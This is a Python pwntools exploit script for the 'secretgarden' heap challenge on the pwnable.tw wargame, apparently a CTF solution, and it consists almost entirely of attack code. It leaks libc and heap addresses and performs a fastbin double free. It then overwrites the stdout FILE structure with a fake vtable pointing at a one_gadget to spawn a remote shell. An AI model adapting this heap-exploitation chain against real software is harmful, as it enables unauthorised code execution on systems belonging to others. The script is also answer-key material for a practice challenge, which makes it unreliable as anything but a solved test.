#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
local = 0
if local:
	cn = process('./secretgarden')
	bin = ELF('./secretgarden')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	cn = remote('chall.pwnable.tw', 10203)
	bin = ELF('./secretgarden')
	libc = ELF('./libc_64.so.6')
def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()
def raiseflower(length,name,color):
    cn.recvuntil(":")
    cn.sendline("1")
    cn.recvuntil(":")
    cn.sendline(str(length))
    cn.recvuntil(":")
    cn.send(name)
    cn.recvuntil(":")
    cn.sendline(color)
def visit():
    cn.recvuntil(":")
    cn.sendline("2")
def remove(idx):
    cn.recvuntil(":")
    cn.sendline("3")
    cn.recvuntil(":")
    cn.sendline(str(idx))
def clean():
    cn.recvuntil(":")
    cn.sendline("4")
raiseflower(0x80,'000',"aaa")#0
raiseflower(0x80,'111',"aaa")#1
raiseflower(0x28,'222',"aaa")#2
raiseflower(0x80,'333',"aaa")#3
remove(0)
remove(2)
raiseflower(0x80,'X'*8,"aaa")#4
visit()
cn.recvuntil('X'*8)
if local:
	libc.address = u64(cn.recv(6)+'\x00\x00') - 0x3c4b20 - 88
else:
	libc.address = u64(cn.recv(6)+'\x00\x00') - 0x3c3b20 - 88
success('libc: '+hex(libc.address))
raiseflower(0x40,'55',"aaa")#5
raiseflower(0x40,'66',"aaa")#6
raiseflower(0x40,'77',"aaa")#7
remove(5)
remove(6)
raiseflower(0x40,'Q',"aaa")#8
visit()
cn.recvuntil('Name of the flower[8] :')
heap_base = u64(cn.recv(6)+'\x00\x00')-0x1251
success('heap_base: '+hex(heap_base))
raiseflower(0x40,'99',"aaa")#9 bukong
raiseflower(0x28,'00',"aaa")#10
raiseflower(0x28,'11',"aaa")#11
raiseflower(0x28,'22',"aaa")#12
raiseflower(0x28,'33',"aaa")#13
raiseflower(0x28,'44',"aaa")#14
raiseflower(0x60,'55',"aaa")#15
raiseflower(0x60,'66',"aaa")#16
raiseflower(0x100,'77',"aaa")#17
remove(10)
remove(11)
remove(12)
remove(13)
remove(14)
#fastbin dup
remove(15)
remove(16)
remove(15)
#FILE
_IO_2_1_stdout_ = libc.sym['_IO_2_1_stdout_']
if local:
	onegadget = libc.address + 0x4526a
else:
	onegadget = libc.address + 0x4526a
pay = p64(_IO_2_1_stdout_+0x90+13)
raiseflower(0x60,pay,"aaa")#17
raiseflower(0x60,p64(onegadget)*12,"PAY")#18
raiseflower(0x60,'99',"aaa")#19
jumps_addr = heap_base + 0x1750
pay = '\x00'*0x13 + '\xff\xff\xff\xff' + '\x00'*(9+8+3)
pay += p64(jumps_addr)
raiseflower(0x60,pay,"aaa")#19
cn.interactive()

